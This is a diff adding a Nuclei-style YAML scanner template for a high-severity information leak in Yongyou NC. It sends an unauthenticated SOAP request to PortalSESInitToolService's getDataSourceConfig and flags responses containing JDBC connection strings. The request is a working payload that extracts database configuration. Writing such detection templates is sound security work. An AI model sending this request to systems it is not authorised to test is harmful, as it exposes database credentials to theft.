@@ -1,0 +1,30 @@
+id: yongyou-nc-portalsesinittoolservice-information-leak
+info:
+  name: Yongyou NC PortalSESInitToolService Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-leak
+  metadata:
+    product: Yongyou NC
+http:
+  - raw:
+      - |
+        POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService"><soapenv:Header/><soapenv:Body><por:getDataSourceConfig/></soapenv:Body></soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "jdbc"
+          - "jdbc:oracle"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
